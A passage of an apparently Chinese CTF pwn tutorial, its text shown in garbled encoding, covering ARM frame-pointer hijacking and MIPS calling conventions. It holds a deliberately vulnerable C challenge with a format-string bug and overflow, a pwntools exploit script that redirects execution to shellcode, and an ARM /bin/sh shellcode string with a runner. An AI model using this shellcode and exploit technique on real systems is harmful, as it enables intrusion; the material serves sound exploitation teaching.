      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  Last FP    | &lt;- frame pointer</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯è¿™æ ·å°±ä¸å¥½åˆ©ç”¨ï¼Œåªèƒ½åŠ«æŒåˆ°ä¸Šä¸€å±‚å‡½æ•°çš„å‡½æ•°æ ˆï¼Œé‚£ä¹ˆé€šå¸¸ä¼šå°è¯•åŠ«æŒæ ˆè¿ç§»ä¸€æ®µè·ç¦»ï¼Œä½¿å¾—ä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„å‰©ä¸‹çš„æ±‡ç¼–ä»£ç æ‰€ç”¨åˆ°çš„æ ˆä¸Šæ•°æ®æ˜¯æˆ‘ä»¬ä¼ªé€ çš„æ ˆä¸­çš„æ•°æ®ï¼Œè¿™æ ·å°±èƒ½å®ŒæˆåŠ«æŒä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p>

        <h3 id="2-é¢˜ç›®ï¼š-1"   >
          <a href="#2-é¢˜ç›®ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é¢˜ç›®ï¼š-1" class="headerlink" title="(2)é¢˜ç›®ï¼š"></a>(2)é¢˜ç›®ï¼š</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myFunc</span><span class="params">(<span class="keyword">char</span>* nameSrc,<span class="keyword">int</span> amount,<span class="keyword">int</span>* i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        name[i[<span class="number">0</span>]] = nameSrc[i[<span class="number">0</span>]];</span><br><span class="line">        i[<span class="number">0</span>] = i[<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>( i[<span class="number">0</span>] == amount)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;PIG-007!&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my world!I am PIG-007!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,bss,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">    myFunc(bss,<span class="built_in">strlen</span>(bss),i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨ï¼š-1"   >
          <a href="#3-åˆ©ç”¨ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨ï¼š-1" class="headerlink" title="(3)åˆ©ç”¨ï¼š"></a>(3)åˆ©ç”¨ï¼š</h3>
      <p>ç›´æ¥åŠ«æŒLast FPï¼Œç„¶ååˆ©ç”¨ä¸Šä¸€å±‚å‡½æ•°è¿”å›æ—¶åŠ«æŒæ ˆï¼Œåœ¨æ ˆä¸Šä¿å­˜shellcodeåœ°å€ï¼Œç›´æ¥è¿›å…¥shellcodeå³å¯getshellã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr =  bss_addr + <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*<span class="number">0x14</span></span><br><span class="line">payload += p32(bss_addr + <span class="number">0x18</span>)</span><br><span class="line">payload += p32(bss_addr + <span class="number">0x18</span>)</span><br><span class="line">payload += p32(shellcode_addr)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>pop {fp}ä¹‹åå·²ç»åŠ«æŒæ ˆåˆ°bssæ®µä¸Šäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220032.png" alt="image-20211106220025308"></p>
<p>è¿”å›mainå‡½æ•°ä¹‹åï¼Œåˆ©ç”¨mainå‡½æ•°ä¸­çš„è¿”å›æŒ‡ä»¤<code>sub sp,fp,#4</code>å®Œæˆæ ˆåŠ«æŒ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220242.png" alt="image-20211106220242850"></p>
<p>ç„¶åå°±åˆ©ç”¨<code>pop &#123;fp, pc&#125;</code>æ¥åŠ«æŒè¿”å›åœ°å€ï¼Œè¿›å…¥åˆ°æˆ‘ä»¬è¾“å…¥çš„bssæ®µä¸Šshellcodeçš„åœ°æ–¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106221534.png" alt="image-20211106221534722"></p>

        <h4 id="æ³¨ï¼š"   >
          <a href="#æ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ³¨ï¼š" class="headerlink" title="æ³¨ï¼š"></a>æ³¨ï¼š</h4>
      <p>ä¸åœ¨bssæ®µä¸Šæ—¶ï¼Œæˆ‘ä»¬åŠ«æŒå®ŒLast FPï¼Œè¿”å›ä¸Šä¸€å±‚å‡½æ•°æ ˆä¸­æ—¶ï¼Œå½“æº¢å‡ºé•¿åº¦è¶³å¤Ÿï¼Œå¯ç›´æ¥ä¿®æ”¹ä¸Šä¸€å±‚å‡½æ•°æ ˆä¸­çš„æ•°æ®ï¼Œç›¸å½“äºå°±æ˜¯éå¶å­å‡½æ•°çš„æº¢å‡ºäº†ã€‚</p>
<p>è‡³äºæº¢å‡ºé•¿åº¦ä¸å¤Ÿï¼Œåªèƒ½åŠ«æŒLast FPçš„æ—¶å€™ï¼Œåˆæ— æ³•æ³„éœ²åœ°å€ï¼Œæ„Ÿè§‰ä¸å¤ªèƒ½æï¼Œæˆ–è€…ä¸Šä¸Šä¸€å±‚å‡½æ•°ä¸­æœ‰å‰©ä¸‹å¯åˆ©ç”¨çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±éƒ¨åˆ†åŠ«æŒLast FPï¼Œåˆ©ç”¨ä¸Šä¸Šä¸€å±‚å‡½æ•°ä¸­å‰©ä¸‹çš„æ±‡ç¼–æ¥getshellï¼Œè¿™ä¸ªå…·ä½“çœ‹é¢˜ç›®ã€‚</p>

        <h2 id="4-æ ¼å¼åŒ–å­—ç¬¦ä¸²"   >
          <a href="#4-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="4.æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>4.æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2>
      <p>armæ¶æ„ä¸‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²çš„é¡ºåºæ˜¯R1,R2,R3,æ ˆï¼Œå…¶ä»–çš„ç›¸å…³åˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œä¸å†å¤šè¯´ã€‚</p>

        <h2 id="5-å †"   >
          <a href="#5-å †" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å †" class="headerlink" title="5.å †"></a>5.å †</h2>
      <p>å †çš„åˆ©ç”¨æ–¹æ³•ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚</p>
<p>å‚è€ƒï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112#h3-20" >ARMæ¶æ„ä¸‹çš„ Pwn çš„ä¸€èˆ¬è§£å†³æ€è·¯ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="Shellcode"   >
          <a href="#Shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *SC =      <span class="string">&quot;\x01\x30\x8f\xe2&quot;</span></span><br><span class="line">                <span class="string">&quot;\x13\xff\x2f\xe1&quot;</span></span><br><span class="line">                <span class="string">&quot;\x78\x46\x0e\x30&quot;</span></span><br><span class="line">                <span class="string">&quot;\x01\x90\x49\x1a&quot;</span></span><br><span class="line">                <span class="string">&quot;\x92\x1a\x08\x27&quot;</span></span><br><span class="line">                <span class="string">&quot;\xc2\x51\x03\x37&quot;</span></span><br><span class="line">                <span class="string">&quot;\x01\xdf\x2f\x62&quot;</span></span><br><span class="line">                <span class="string">&quot;\x69\x6e\x2f\x2f&quot;</span></span><br><span class="line">                <span class="string">&quot;\x73\x68&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> payload[<span class="number">34</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(payload, SC, <span class="number">34</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;Length: %d\n&quot;</span>, <span class="built_in">strlen</span>(SC));</span><br><span class="line">    (*(<span class="keyword">void</span>(*)()) payload) ();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¸‰ã€MIPS"   >
          <a href="#ä¸‰ã€MIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€MIPS" class="headerlink" title="ä¸‰ã€MIPS"></a>ä¸‰ã€MIPS</h1>
      <p>ä¸»è¦ä»‹ç»mipselæ¶æ„çš„ï¼Œå°ç«¯åºï¼Œå¤§ç«¯çš„mipså¾ˆå°‘è€ƒåˆ°ï¼Œè€Œä¸”ä¹ŸåŸºæœ¬éƒ½æ˜¯å¤§åŒå°å¼‚</p>

        <h2 id="1-æµæ°´çº¿ç‰¹ç‚¹"   >
          <a href="#1-æµæ°´çº¿ç‰¹ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æµæ°´çº¿ç‰¹ç‚¹" class="headerlink" title="1.æµæ°´çº¿ç‰¹ç‚¹"></a>1.æµæ°´çº¿ç‰¹ç‚¹</h2>
      <p>ä»¥ä¸‹æŒ‡ä»¤çš„ï¼Œstrchr å‡½æ•°çš„å‚æ•°æ¥è‡ª $s0 è€Œä¸æ˜¯ $s2</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $a0, $s2;</span><br><span class="line">jalr strchr;</span><br><span class="line">move $a0, $s0;</span><br></pre></td></tr></table></div></figure>


        <h2 id="ğŸ”ºæ³¨ï¼šæµæ°´çº¿"   >
          <a href="#ğŸ”ºæ³¨ï¼šæµæ°´çº¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼šæµæ°´çº¿" class="headerlink" title="ğŸ”ºæ³¨ï¼šæµæ°´çº¿"></a>ğŸ”ºæ³¨ï¼šæµæ°´çº¿</h2>
      <p>å³è·³è½¬ä¹‹å‰ä¼šå…ˆä¸€æ­¥åŠ è½½ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ‰€ä»¥åœ¨å¯»æ‰¾ROPæ—¶ï¼Œæ³¨æ„çœ‹ä¸‹ä¸€æ­¥æŒ‡ä»¤éƒ½æ˜¯ä»€ä¹ˆï¼Œä¸ç„¶è·³è½¬è¿‡å»å‚æ•°æˆ–è€…æ ˆå¸§éƒ½æœ‰å¯èƒ½ä¼šå‡ºé”™çš„ã€‚</p>
<p>ä½†æ˜¯å› ä¸ºé€šå¸¸PWNé¢˜çš„MIPSé€šå¸¸æ˜¯ç”¨qemuçš„useræ¨¡å¼è¿è¡Œçš„ï¼Œè¿™ä¸ªå¯èƒ½å¯¼è‡´æŒ‡ä»¤æµæ°´æœ‰æ—¶å€™è¡¨ç°ä¸å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ²¡æœ‰è°ƒç”¨å‡½æ•°sleep(1)å»å°†æ•°æ®åŒºåˆ·æ–°åˆ°æŒ‡ä»¤åŒºåŸŸä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°shellçš„ï¼›ä½†æ˜¯å¦‚æœé¢˜ç›®ä½¿ç”¨systemæ¨¡å¼éƒ¨ç½²ï¼Œæ·»åŠ è°ƒç”¨å‡½æ•°åˆ·æ–°æ•°æ®åŒºåŸŸå†è·³è½¬åˆ°shellcodeå°±å¾ˆå¿…è¦äº†ï¼Œä½†å¦‚æœæ˜¯ROPæ¥getshellå€’æ˜¯ä¸ç”¨åˆ·æ–°æ•°æ®ã€‚</p>

        <h2 id="2-æ ˆæœºåˆ¶"   >
          <a href="#2-æ ˆæœºåˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ˆæœºåˆ¶" class="headerlink" title="2.æ ˆæœºåˆ¶"></a>2.æ ˆæœºåˆ¶</h2>
      
        <h3 id="å‡½æ•°è°ƒç”¨"   >
          <a href="#å‡½æ•°è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°è°ƒç”¨" class="headerlink" title="å‡½æ•°è°ƒç”¨"></a>å‡½æ•°è°ƒç”¨</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A14                 la      $t9, sobj_del</span><br><span class="line">.text:00409A18                 nop</span><br><span class="line">.text:00409A1C                 jalr    $t9 ; sobj_del</span><br><span class="line">.text:00409A20                 move    $a0, $s5</span><br><span class="line">.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)</span><br></pre></td></tr></table></div></figure>

<p>å¸¸è§äºåº“å‡½æ•°</p>
<ul>
<li><p>é€šè¿‡<code>$t9</code>æ¥è·³è½¬</p>
</li>
<li><p>è·³è½¬æŒ‡ä»¤ä¸º<code>jalr</code>ï¼Œä¿å­˜è¿”å›åœ°å€åˆ°<code>$ra</code>ï¼Œè¿™é‡Œçš„è¿”å›åœ°å€å³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A24                 lw      $gp, 0x4C0+var_4B0($sp)</span><br></pre></td></tr></table></div></figure></li>
<li><p>ç”±äºäº”çº§æµæ°´çº¿ï¼Œæ‰€ä»¥é€šå¸¸åœ¨è·³è½¬æŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤åŠ è½½å‚æ•°ï¼Œè¿™é‡Œå³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A20                 move    $a0, $s5</span><br></pre></td></tr></table></div></figure>

<p>å½“ç„¶å¦‚æœæ¶‰åŠåˆ°å¤šä¸ªå‚æ•°å°±ä¼šæå‰åŠ è½½äº†</p>
</li>
</ul>

        <h3 id="å‡½æ•°æ ˆåŠ è½½"   >
          <a href="#å‡½æ•°æ ˆåŠ è½½" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°æ ˆåŠ è½½" class="headerlink" title="å‡½æ•°æ ˆåŠ è½½"></a>å‡½æ•°æ ˆåŠ è½½</h3>
      
        <h4 id="å¶å­å‡½æ•°"   >
          <a href="#å¶å­å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¶å­å‡½æ•°" class="headerlink" title="å¶å­å‡½æ•°"></a>å¶å­å‡½æ•°</h4>
      <p>å¶å­å‡½æ•°ä¸éœ€è¦å°†è¿”å›åœ°å€ä¿å­˜åˆ°æ ˆä¸Šï¼Œæ‰€ä»¥ä¸€èˆ¬åªéœ€è¦å°†å‚æ•°æ”¾å…¥æ ˆä¸­</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//æ ˆç©ºé—´å¼€è¾Ÿ</span><br><span class="line">.text:00400834                 addiu   $sp, -0x30</span><br><span class="line">//æ ˆæŒ‡é’ˆè®¾ç½®</span><br><span class="line">.text:00400838                 sw      $fp, 0x2C+var_s0($sp)</span><br><span class="line">.text:0040083C                 move    $fp, $sp</span><br><span class="line">//å‚æ•°å…¥æ ˆ</span><br><span class="line">.text:00400840                 sw      $a0, 0x2C+test($fp)</span><br></pre></td></tr></table></div></figure>

<p>æœ‰çš„ä¹Ÿä¼šæœ‰å…³äº<code>$gp</code>æŒ‡é’ˆçš„è®¾ç½®ï¼Œä¸€èˆ¬æ˜¯ç”¨åˆ°äº†å…¨å±€å˜é‡ï¼Œå¸¸é‡ä»€ä¹ˆçš„</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00409480                 lui     $gp, 0x43  # &#x27;C&#x27;</span><br><span class="line">.text:00409484                 addiu   $sp, -0x4E8</span><br><span class="line">.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br></pre></td></tr></table></div></figure>


        <h4 id="éå¶å­å‡½æ•°"   >
          <a href="#éå¶å­å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#éå¶å­å‡½æ•°" class="headerlink" title="éå¶å­å‡½æ•°"></a>éå¶å­å‡½æ•°</h4>
      <p>éå¶å­å‡½æ•°éœ€è¦å°†è¿”å›åœ°å€ä¿å­˜åˆ°æ ˆä¸Š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00409480                 lui     $gp, 0x43  # &#x27;C&#x27;</span><br><span class="line">//æ ˆç©ºé—´å¼€è¾Ÿ</span><br><span class="line">.text:00409484                 addiu   $sp, -0x4E8</span><br><span class="line">.text:00409488                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br><span class="line">.text:0040948C                 sw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409490                 sw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">//è¿”å›åœ°å€$raå…¥æ ˆ</span><br></pre></td></tr></table></div></figure>


        <h3 id="å‡½æ•°è¿”å›"   >
          <a href="#å‡½æ•°è¿”å›" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‡½æ•°è¿”å›" class="headerlink" title="å‡½æ•°è¿”å›"></a>å‡½æ•°è¿”å›</h3>
      
        <h4 id="å¶å­å‡½æ•°-1"   >
          <a href="#å¶å­å‡½æ•°-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¶å­å‡½æ•°-1" class="headerlink" title="å¶å­å‡½æ•°"></a>å¶å­å‡½æ•°</h4>
      <p>å¶å­å‡½æ•°ç›´æ¥é€šè¿‡<code>$ra</code>å¯„å­˜å™¨è¿”å›</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//....ä¸€äº›å‚æ•°åŠ è½½</span><br><span class="line">.text:00409A54                 jr      $ra</span><br><span class="line">//æ ˆç©ºé—´é”€æ¯</span><br><span class="line">.text:00409A58                 addiu   $sp, 0x4E8</span><br></pre></td></tr></table></div></figure>


        <h4 id="éå¶å­å‡½æ•°-1"   >
          <a href="#éå¶å­å‡½æ•°-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#éå¶å­å‡½æ•°-1" class="headerlink" title="éå¶å­å‡½æ•°"></a>éå¶å­å‡½æ•°</h4>
      <p>éå¶å­å‡½æ•°éœ€è¦ä»æ ˆä¸­è·å–è¿”å›åœ°å€åˆ°<code>$ra</code>å¯„å­˜å™¨ï¼Œç„¶åä¹Ÿæ˜¯é€šè¿‡<code>$ra</code>å¯„å­˜å™¨è¿”å›</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//ä¸€äº›å¤„ç†å·¥ä½œ....</span><br><span class="line">.text:0040091C                 move    $sp, $fp</span><br><span class="line">//è·å–æ ˆä¸Šçš„è¿”å›åœ°å€</span><br><span class="line">.text:00400920                 lw      $ra, 0x28+var_s4($sp)</span><br><span class="line">.text:00400924                 lw      $fp, 0x28+var_s0($sp)</span><br><span class="line">//é€šè¿‡$raè¿”å›</span><br><span class="line">.text:00400928                 jr      $ra</span><br><span class="line">//æ ˆç©ºé—´é”€æ¯</span><br><span class="line">.text:0040092C                 addiu   $sp, 0x30</span><br></pre></td></tr></table></div></figure>


        <h3 id="æ€»ç»“ï¼š"   >
          <a href="#æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3>
      <p>æ€»çš„æ¥è¯´ï¼Œå’Œx86ä¹Ÿæ˜¯æœ‰ç‚¹ç›¸ä¼¼ï¼Œä¸åŒçš„å°±æ˜¯å…³äº<code>$ra</code>å¯„å­˜å™¨çš„ä½¿ç”¨ï¼Œä»¥åŠå¶å­å‡½æ•°å’Œéå¶å­å‡½æ•°çš„åŒºåˆ«ï¼Œè¿˜æœ‰ä¸€äº›äº”çº§æµæ°´çº¿æœºåˆ¶ã€‚</p>

        <h2 id="3-å¯„å­˜å™¨å…³ç³»"   >
          <a href="#3-å¯„å­˜å™¨å…³ç³»" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¯„å­˜å™¨å…³ç³»" class="headerlink" title="3.å¯„å­˜å™¨å…³ç³»"></a>3.å¯„å­˜å™¨å…³ç³»</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">REGISTER</th>
<th align="left">NAME</th>
<th align="left">USAGE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$0</td>
<td align="left">$zero</td>
<td align="left">å¸¸é‡0(constant value 0)</td>
</tr>
<tr>
<td align="left">$1</td>
<td align="left">$at</td>
<td align="left">ä¿ç•™ç»™æ±‡ç¼–å™¨(Reserved for assembler)</td>
</tr>
<tr>
<td align="left">$2-$3</td>
<td align="left">$v0 - $v1</td>
<td align="left">å‡½æ•°è°ƒç”¨è¿”å›å€¼(values for results and expression evaluation)</td>
</tr>
<tr>
<td align="left">$4-$7</td>
<td align="left">$a0-$a3</td>
<td align="left">å‡½æ•°è°ƒç”¨å‚æ•°(arguments)</td>
</tr>
<tr>
<td align="left">$8-$15</td>
<td align="left">$t0-$t7</td>
<td align="left">æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)</td>
</tr>
<tr>
<td align="left">$16-$23</td>
<td align="left">$s0-$s7</td>
<td align="left">ä¿å­˜çš„(æˆ–å¦‚æœç”¨ï¼Œéœ€è¦SAVE/RESTOREçš„)(saved)</td>
</tr>
<tr>
<td align="left">$24-$25</td>
<td align="left">$t8-$t9</td>
<td align="left">æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„),$t9é€šå¸¸ä¼šåœ¨å‡½æ•°è°ƒç”¨æ—¶ç”¨åˆ°</td>
</tr>
<tr>
<td align="left">$28</td>
<td align="left">$gp</td>
<td align="left">å…¨å±€æŒ‡é’ˆ(Global Pointer),é€šå¸¸æœ‰å…¨å±€å˜é‡ã€å¸¸é‡ä¹‹ç±»ä¼šç”¨åˆ°</td>
</tr>
<tr>
<td align="left">$29</td>
<td align="left">$sp</td>
<td align="left">å †æ ˆæŒ‡é’ˆ(Stack Pointer)</td>
</tr>
<tr>
<td align="left">$30</td>
<td align="left">$fp</td>
<td align="left">å¸§æŒ‡é’ˆ(Frame Pointer)</td>
</tr>
</tbody></table></div>
<p>è¯´æ˜</p>
<ul>
<li>$0</li>
</ul>
<p>å³$zero,è¯¥å¯„å­˜å™¨æ€»æ˜¯è¿”å›é›¶ï¼Œä¸º0è¿™ä¸ªæœ‰ç”¨å¸¸æ•°æä¾›äº†ä¸€ä¸ªç®€æ´çš„ç¼–ç å½¢å¼ã€‚</p>
